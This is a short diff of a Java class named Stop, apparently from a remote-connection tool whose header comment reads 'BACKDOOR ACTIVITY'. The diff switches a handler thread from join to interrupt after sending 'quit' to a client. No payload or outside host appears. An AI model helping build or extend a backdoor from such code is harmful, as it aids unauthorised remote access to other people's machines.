@@ -3,6 +3,8 @@ import java.io.IOException;
 import java.io.PrintWriter;
 import java.net.SocketException;
 
+import static java.lang.Thread.sleep;
+
 /*
 BACKDOOR ACTIVITY
  */
@@ -38,7 +40,8 @@ public class Stop implements Runnable {
             }
             clientPrint.println("quit");
             clientPrint.flush();
-            handler.join();
+            handler.interrupt();
+           //handler.join();// join or intterupt?
             System.out.println();
             System.out.println("Waiting for next connection...");
             return;
